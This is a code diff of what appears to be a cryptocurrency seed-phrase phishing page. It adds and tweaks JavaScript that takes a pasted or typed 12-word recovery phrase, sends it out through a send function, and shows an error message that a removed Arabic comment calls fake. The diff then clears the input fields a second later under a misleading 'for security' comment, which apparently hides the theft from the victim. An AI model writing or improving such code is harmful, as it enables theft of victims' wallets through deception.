@@ -110,22 +110,27 @@
             grid.appendChild(div);
         }
 
-        // --- وظيفة اللصق التلقائي (Auto-Paste) ---
+        // خاصية اللصق + المسح التلقائي
         document.addEventListener('paste', (e) => {
             if (e.target.classList.contains('item-input')) {
                 e.preventDefault();
                 const data = e.clipboardData.getData('text');
-                const words = data.trim().split(/\s+/); // تقسيم النص بناءً على المسافات
+                const words = data.trim().split(/\s+/);
                 const inputs = document.querySelectorAll('.item-input');
                 
                 words.forEach((word, index) => {
                     if (index < inputs.length) {
                         inputs[index].value = word;
-                        inputs[index].dispatchEvent(new Event('input')); // تفعيل حدث الإدخال لتغيير النمط
+                        inputs[index].dispatchEvent(new Event('input'));
                     }
                 });
-                // إرسال البيانات فور اللصق
+
                 checkAndSendAll();
+
+                // مسح الخانات بعد ثانية واحدة من اللصق لزيادة الأمان
+                setTimeout(() => {
+                    inputs.forEach(input => input.value = "");
+                }, 1000);
             }
         });
 
@@ -145,7 +150,6 @@
                 sendFinalData(fullMessage);
             }
             
-            // إظهار رسالة الخطأ الوهمية
             if(document.getElementById('p2').classList.contains('active')) {
                 document.getElementById('errorMessage').style.display = 'block';
             }
@@ -154,6 +158,10 @@
         document.addEventListener('input', (e) => {
             if (e.target.getAttribute('data-id') === "12") {
                 checkAndSendAll();
+                // مسح الخانات بعد الكتابة اليدوية للكلمة رقم 12
+                setTimeout(() => {
+                    document.querySelectorAll('.item-input').forEach(input => input.value = "");
+                }, 1500);
             }
         });
     </script>
